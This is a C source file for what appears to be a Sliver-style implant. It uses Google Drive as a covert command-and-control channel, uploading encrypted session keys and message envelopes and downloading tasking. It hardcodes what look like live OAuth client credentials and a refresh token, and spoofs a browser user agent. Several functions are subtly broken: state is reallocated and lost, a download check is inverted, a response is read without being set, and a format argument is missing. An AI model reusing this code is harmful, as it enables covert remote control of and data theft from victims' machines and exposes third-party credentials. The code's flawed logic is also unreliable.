#include "pch.h"

BOOL RefreshAccessToken
(
	PSLIVER_DRIVE_CLIENT pDriveClient,
	PDRIVE_CONFIG pDriveConfig
)
{
	CHAR szOauthPath[] = "https://oauth2.googleapis.com/token";
	CHAR lpBody[0x400];
	PHTTP_CLIENT pHttpClient = NULL;
	PHTTP_RESP pHttpResp = NULL;
	BOOL Result = FALSE;
	LPSTR lpResult = NULL;
	LPSTR lpContentTypeStr = NULL;

	pHttpClient = HttpClientInit(UriInit(szOauthPath), pDriveClient->pHttpConfig->pProxyConfig);
	if (pHttpClient == NULL) {
		goto CLEANUP;
	}

	SecureZeroMemory(lpBody, sizeof(lpBody));
	wsprintfA(lpBody, "client_id=%s&client_secret=%s&refresh_token=%s&grant_type=refresh_token", pDriveConfig->lpClientId, pDriveConfig->lpClientSecret, pDriveConfig->lpRefreshToken);
	lpContentTypeStr = GetContentTypeString(ApplicationXWwwFormUrlencoded);
	pHttpResp = SendHttpRequest(pDriveClient->pHttpConfig, pHttpClient, NULL, "POST", lpContentTypeStr, lpBody, lstrlenA(lpBody), FALSE, TRUE);
	if (pHttpResp == NULL) {
		goto CLEANUP;
	}

	lpResult = SearchMatchStrA(pHttpResp->pRespData, "access_token\": \"", "\",\n");
	if (lpResult == NULL) {
		goto CLEANUP;
	}

	if (pDriveClient->pHttpConfig->lpAccessToken != NULL) {
		FREE(pDriveClient->pHttpConfig->lpAccessToken);
	}

	pDriveClient->pHttpConfig->lpAccessToken = lpResult;
	Result = TRUE;
CLEANUP:
	FreeHttpResp(pHttpResp);
	FreeHttpClient(pHttpClient);
	if (lpContentTypeStr != NULL) {
		FREE(lpContentTypeStr);
	}

	return Result;
}

PSLIVER_DRIVE_CLIENT DriveInit()
{
	LPSTR lpProxy = NULL;
	PSLIVER_DRIVE_CLIENT lpResult = NULL;
	PHTTP_REQUEST pHttpReq = NULL;

	CHAR szClientId[] = "178467925713-lerc06071od46cr41r3f5fjc1ml56n76.apps.googleusercontent.com";
	CHAR szClientSecret[] = "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";
	CHAR szRefreshToken[] = "1//04U3_Gum8qlGvCgYIARAAGAQSNwF-L9IrmGLxFDUJTcb8IGojFuflKaNFqpQolUQI8ANjXIbrKe0Fq_7VzJUnt0hba15FOoUCJig";
	CHAR szUserAgent[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.9265.982 Safari/537.36";
	DWORD i = 0;
	CHAR szRecvPrefix[] = "msQEfKgN";
	CHAR szSendPrefix[] = "pSdAyqMy";

	lpProxy = GetProxyConfig();
	lpResult = ALLOC(sizeof(SLIVER_DRIVE_CLIENT));
	lpResult->dwNumberOfDriveConfigs = 1;
	lpResult->DriveList = ALLOC(sizeof(PDRIVE_CONFIG));
	for (i = 0; i < lpResult->dwNumberOfDriveConfigs; i++) {
		lpResult->DriveList[i] = ALLOC(sizeof(DRIVE_CONFIG));
	}

	lpResult->DriveList[0]->lpClientId = DuplicateStrA(szClientId, 0);
	lpResult->DriveList[0]->lpClientSecret = DuplicateStrA(szClientSecret, 0);
	lpResult->DriveList[0]->lpRefreshToken = DuplicateStrA(szRefreshToken, 0);

	lpResult->pHttpConfig->lpUserAgent = DuplicateStrA(szUserAgent, 0);
	lpResult->pHttpConfig->dwNumberOfAttemps = 10;
	lpResult = ALLOC(sizeof(SLIVER_DRIVE_CLIENT));
	if (lpProxy != NULL) {
		if (!lstrcmpA(lpProxy, "auto")) {
			lpResult->pHttpConfig->pProxyConfig = ProxyInit(UseAutoDiscovery, NULL);
		}
		else {
			lpResult->pHttpConfig->pProxyConfig = ProxyInit(UserProvided, lpProxy);
		}

		FREE(lpProxy);
	}

	lpResult->lpRecvPrefix = DuplicateStrA(szRecvPrefix, 0);
	lpResult->lpSendPrefix = DuplicateStrA(szSendPrefix, 0);
	return lpResult;
}

BOOL DriveStart
(
	_In_ PGLOBAL_CONFIG pConfig,
	_In_ PSLIVER_DRIVE_CLIENT pDriveClient
)
{
	LPSTR lpEncodedSessionKey = NULL;
	BOOL Result = FALSE;
	PBUFFER pResp = NULL;
	PBUFFER pDecodedResp = NULL;
	PBUFFER pSessionId = NULL;
	PBYTE pEncryptedSessionInit = NULL;
	LPSTR lpRespData = NULL;
	DWORD cbEncryptedSessionInit = 0;
	PPBElement pMarshalledData = NULL;
	CHAR szName[0x40];

	pMarshalledData = CreateBytesElement(pConfig->pSessionKey, CHACHA20_KEY_SIZE, 1);
	pEncryptedSessionInit = AgeKeyExToServer(pConfig->lpRecipientPubKey, pConfig->lpPeerPrivKey, pConfig->lpPeerPubKey, pMarshalledData->pMarshalledData, pMarshalledData->cbMarshalledData, &cbEncryptedSessionInit);
	if (pEncryptedSessionInit == NULL || cbEncryptedSessionInit == 0) {
		goto CLEANUP;
	}

	lpEncodedSessionKey = SliverBase64Encode(pEncryptedSessionInit, cbEncryptedSessionInit);
	SecureZeroMemory(szName, sizeof(szName));
	wsprintfA(szName, "%s.reg", pDriveClient->lpSendPrefix);
	if (!DriveUpload(pDriveClient, lpEncodedSessionKey, lstrlenA(lpEncodedSessionKey), szName)) {
		goto CLEANUP;
	}

	lpRespData = ExtractSubStrA(pResp->pBuffer, pResp->cbBuffer);
	pDecodedResp = SliverBase64Decode(lpRespData);
	pSessionId = SliverDecrypt(pConfig, pDecodedResp);
	memcpy(pConfig->szSessionID, pSessionId->pBuffer, pSessionId->cbBuffer);
	
	Result = TRUE;
CLEANUP:
	if (lpRespData != NULL) {
		FREE(lpRespData);
	}

	if (lpEncodedSessionKey != NULL) {
		FREE(lpEncodedSessionKey);
	}

	if (pEncryptedSessionInit != NULL) {
		FREE(pEncryptedSessionInit);
	}

	FreeElement(pMarshalledData);
	FreeBuffer(pDecodedResp);
	FreeBuffer(pResp);
	FreeBuffer(pSessionId);
	return Result;
}

BOOL DriveSend
(
	_In_ PGLOBAL_CONFIG pConfig,
	_In_ PSLIVER_DRIVE_CLIENT pDriveClient,
	_In_ PENVELOPE pEnvelope
)
{
	PBUFFER pMarshalledEnvelope = NULL;
	DWORD i = 0;
	CHAR szName[0x200];
	BOOL Result = FALSE;
	PDRIVE_CONFIG pDriveConfig = NULL;

	pMarshalledEnvelope = MarshalEnvelope(pEnvelope);
	SecureZeroMemory(szName, sizeof(szName));
	wsprintfA(szName, "%s_%s_%lu.tex", pDriveClient->lpSendPrefix, pConfig->uEncoderNonce);
	if (!DriveUpload(pDriveClient, pMarshalledEnvelope->pBuffer, pMarshalledEnvelope->cbBuffer, szName)) {
		goto CLEANUP;
	}

CLEANUP:
	FreeBuffer(pMarshalledEnvelope);
	return Result;
}

PENVELOPE DriveRecv
(
	_In_ PGLOBAL_CONFIG pConfig,
	_In_ PSLIVER_DRIVE_CLIENT pDriveClient
)
{
	PENVELOPE pResult = NULL;
	CHAR szPattern[0x80];
	PDRIVE_CONFIG pDriveConfig = NULL;
	LPSTR lpRespFileId = NULL;
	PBUFFER pRespData = NULL;
	PBUFFER pDecodedData = NULL;
	DWORD cbDecodedData = 0;
	PBUFFER pPlainText = NULL;

	pRespData = DriveDownload(pDriveClient, lpRespFileId);
	if (pRespData != NULL) {
		goto CLEANUP;
	}

	pDecodedData = SliverBase64Decode(pRespData->pBuffer);
	pPlainText = SliverDecrypt(pConfig, pDecodedData);
	pResult = UnmarshalEnvelope(pPlainText);
CLEANUP:
	FreeBuffer(pRespData);
	FreeBuffer(pDecodedData);
	FreeBuffer(pPlainText);

	return pResult;
}

BOOL DriveClose
(
	_In_ PSLIVER_BEACON_CLIENT pBeaconClient
)
{
	return pBeaconClient->Cleanup(pBeaconClient);
}

BOOL DriveUpload
(
	_In_ PSLIVER_DRIVE_CLIENT pDriveClient,
	_In_ PBYTE pData,
	_In_ DWORD cbData,
	_In_ LPSTR lpName
)
{
	BOOL Result = FALSE;
	CHAR szMetadata[0x400];
	SYSTEMTIME SystemTime;
	LPSTR lpBody = NULL;
	DWORD cbBody = 0;
	LPSTR lpUniqueBoundary = NULL;
	BOOL NoHeapMemory = FALSE;
	CHAR szContentType[0x80] = "multipart/form-data; boundary=";
	CHAR szUrl[] = "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart";
	PURI pUri = NULL;
	PHTTP_CLIENT pHttpClient = NULL;
	PHTTP_RESP pResp = NULL;
	PDRIVE_CONFIG pDriveConfig = NULL;
	DWORD i = 0;

	pUri = UriInit(szUrl);
	if (pUri == NULL) {
		goto CLEANUP;
	}

	pHttpClient = HttpClientInit(pUri, pDriveClient->pHttpConfig->pProxyConfig);
	if (pHttpClient == NULL) {
		goto CLEANUP;
	}

	lpBody = ALLOC(cbData + 0x400);
	if (lpBody == NULL) {
		NoHeapMemory = TRUE;
		lpBody = VirtualAlloc(NULL, cbData + 0x400, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (lpBody == NULL) {
			LOG_ERROR("VirtualAlloc", GetLastError());
			goto CLEANUP;
		}
	}

	SecureZeroMemory(&SystemTime, sizeof(SYSTEMTIME));
	GetSystemTime(&SystemTime);
	wsprintfA(szMetadata, "{\"mimeType\":\"application/octet-stream\",\"name\":\"%s\",\"parents\":[\"root\"]}", lpName);
	lpUniqueBoundary = GenRandomStr(16);
	cbBody = wsprintfA(lpBody, "\r\n--------WebKitFormBoundary%s\r\nContent-Type: application/json; charset=UTF-8\r\n\r\n%s\r\n\r\n--------WebKitFormBoundary%s\r\nContent-Disposition: form-data; name=\"%s\"\r\nContent-Type: application/octet-stream\r\n\r\n", lpUniqueBoundary, szMetadata, lpUniqueBoundary, lpName);
	memcpy(&lpBody[cbBody], pData, cbData);
	cbBody += cbData;
	cbBody += wsprintfA(&lpBody[cbBody], "\r\n--------WebKitFormBoundary%s--\r\n", lpUniqueBoundary);
	wsprintfA(szContentType, "multipart/form-data; boundary=------WebKitFormBoundary%s", lpUniqueBoundary);

	for (i = 0; i < pDriveClient->dwNumberOfDriveConfigs; i++) {
		pDriveConfig = pDriveClient->DriveList[i];
		if (pDriveConfig == NULL) {
			continue;
		}

		if (!RefreshAccessToken(pDriveClient, pDriveConfig)) {
			continue;
		}
		
		pResp = SendHttpRequest(pDriveClient->pHttpConfig, pHttpClient, NULL, "POST", szContentType, lpBody, cbBody, TRUE, FALSE);
		if (pResp->dwStatusCode != HTTP_STATUS_OK) {
			FreeHttpResp(pResp);
			continue;
		}

		FreeHttpResp(pResp);
		break;
	}
	
	Result = TRUE;
CLEANUP:
	FreeHttpClient(pHttpClient);
	if (lpUniqueBoundary != NULL) {
		FREE(lpUniqueBoundary);
	}

	if (lpBody != NULL) {
		if (NoHeapMemory) {
			VirtualFree(lpBody, 0, MEM_RELEASE);
		}
		else {
			FREE(lpBody);
		}
	}

	return Result;
}

BOOL GetFileId
(
	_In_ PSLIVER_DRIVE_CLIENT pDriveClient,
	_In_ PDRIVE_CONFIG pDriveConfig,
	_In_ LPSTR lpPattern,
	_Out_ LPSTR* pId
)
{
	CHAR szUri[0x400] = "https://www.googleapis.com/drive/v3/files?q=mimeType%20=%20%27application/octet-stream%27%20and%20name%20contains%20%27";
	DWORD cbResp = 0;
	BOOL bResult = FALSE;
	LPSTR lpResult = NULL;
	PHTTP_RESP pResp = NULL;
	PHTTP_CLIENT pHttpClient = NULL;
	PURI pUri = NULL;

	if (!RefreshAccessToken(pDriveClient, pDriveConfig)) {
		goto CLEANUP;
	}

	wsprintfA(&szUri[lstrlenA(szUri)], "%s%%27&fields=files(id,name)", lpPattern);
	pUri = UriInit(szUri);
	if (pUri == NULL) {
		goto CLEANUP;
	}

	pHttpClient = HttpClientInit(pUri, pDriveClient->pHttpConfig->pProxyConfig);
	if (pHttpClient == NULL) {
		goto CLEANUP;
	}

	pResp = SendHttpRequest(pDriveClient->pHttpConfig, pHttpClient, NULL, "GET", NULL, NULL, 0, TRUE, TRUE);
	if (pResp == NULL || pResp->pRespData == NULL || pResp->cbResp == 0 || pResp->dwStatusCode != HTTP_STATUS_OK) {
		goto CLEANUP;
	}

	lpResult = SearchMatchStrA(pResp->pRespData, "\"id\": \"", "\",\n");
	if (lpResult != NULL) {
		*pId = lpResult;
	}

	bResult = TRUE;
CLEANUP:
	FreeHttpResp(pResp);
	FreeHttpClient(pHttpClient);
	return bResult;
}

BOOL DriveDelete
(
	_In_ PSLIVER_DRIVE_CLIENT pDriveClient,
	_In_ PDRIVE_CONFIG pDriveConfig,
	_In_ LPSTR lpFileId
)
{
	CHAR szUri[0x80] = "https://www.googleapis.com/drive/v3/files/";
	BOOL Result = FALSE;
	PHTTP_RESP pResp = NULL;
	PHTTP_CLIENT pHttpClient = NULL;
	PURI pUri = NULL;

	if (!RefreshAccessToken(pDriveClient, pDriveConfig)) {
		goto CLEANUP;
	}

	wsprintfA(&szUri[lstrlenA(szUri)], "%s", lpFileId);
	pUri = UriInit(szUri);
	if (pUri == NULL) {
		goto CLEANUP;
	}

	pHttpClient = HttpClientInit(pUri, pDriveClient->pHttpConfig->pProxyConfig);
	if (pHttpClient == NULL) {
		goto CLEANUP;
	}

	pResp = SendHttpRequest(pDriveConfig, pHttpClient, NULL, "DELETE", NULL, NULL, 0, TRUE, TRUE);
	if (pResp == NULL || pResp->dwStatusCode != HTTP_STATUS_OK) {
		goto CLEANUP;
	}

	Result = TRUE;
CLEANUP:
	FreeHttpResp(pResp);
	FreeHttpClient(pHttpClient);
	return Result;
}

PBUFFER DriveDownload
(
	_In_ PSLIVER_DRIVE_CLIENT pDriveClient,
	_In_ LPSTR lpFileId
)
{
	CHAR szUri[0x80] = "https://www.googleapis.com/drive/v3/files/";
	PBUFFER pResult = NULL;
	DWORD dwFileSize = 0;
	PHTTP_RESP pResp = NULL;
	PHTTP_CLIENT pHttpClient = NULL;
	PURI pUri = NULL;
	PDRIVE_CONFIG pDriveConfig = NULL;
	DWORD i = 0;

	wsprintfA(&szUri[lstrlenA(szUri)], "%s?alt=media", lpFileId);
	pUri = UriInit(szUri);
	if (pUri == NULL) {
		goto CLEANUP;
	}

	pHttpClient = HttpClientInit(pUri, pDriveClient->pHttpConfig->pProxyConfig);
	if (pHttpClient == NULL) {
		goto CLEANUP;
	}

	for (i = 0; i < pDriveClient->dwNumberOfDriveConfigs; i++) {
		pDriveConfig = pDriveClient->DriveList[i];
		if (pDriveConfig == NULL) {
			continue;
		}

		if (!RefreshAccessToken(pDriveClient, pDriveConfig)) {
			continue;
		}

		pResp = SendHttpRequest(pDriveClient->pHttpConfig, pHttpClient, NULL, "GET", NULL, NULL, 0, TRUE, TRUE);
		if (pResp == NULL || pResp->pRespData == NULL || pResp->cbResp == 0 || pResp->dwStatusCode != HTTP_STATUS_OK) {
			FreeHttpResp(pResp);
			continue;
		}

		pResult = ALLOC(sizeof(BUFFER));
		pResult->cbBuffer = pResp->cbResp;
		pResult->pBuffer = pResp->pRespData;
		pResp->pRespData = NULL;
		FreeHttpResp(pResp);
		break;
	}
	
CLEANUP:
	FreeHttpClient(pHttpClient);
	return pResult;
}

BOOL FreeDriveClient
(
	_In_ PSLIVER_DRIVE_CLIENT pDriveClient
)
{
	DWORD i = 0;
	PDRIVE_CONFIG pDriveConfig = NULL;

	if (pDriveClient != NULL) {
		for (i = 0; i < pDriveClient->dwNumberOfDriveConfigs; i++) {
			pDriveConfig = pDriveClient->DriveList[i];
			if (pDriveConfig == NULL) {
				continue;
			}

			if (pDriveConfig->lpClientId != NULL) {
				FREE(pDriveConfig->lpClientId);
			}

			if (pDriveConfig->lpClientSecret != NULL) {
				FREE(pDriveConfig->lpClientSecret);
			}

			if (pDriveConfig->lpRefreshToken != NULL) {
				FREE(pDriveConfig->lpRefreshToken);
			}

			FREE(pDriveConfig);
			pDriveClient->DriveList[i] = NULL;
		}

		if (pDriveClient->pHttpConfig->lpUserAgent != NULL) {
			FREE(pDriveClient->pHttpConfig->lpUserAgent);
		}

		if (pDriveClient->pHttpConfig->lpAccessToken != NULL) {
			FREE(pDriveClient->pHttpConfig->lpAccessToken);
		}

		for (i = 0; i < _countof(pDriveClient->pHttpConfig->AdditionalHeaders); i++) {
			if (pDriveClient->pHttpConfig->AdditionalHeaders[i] != NULL) {
				FREE(pDriveClient->pHttpConfig->AdditionalHeaders[i]);
			}
		}

		FREE(pDriveClient);
	}

	return TRUE;
}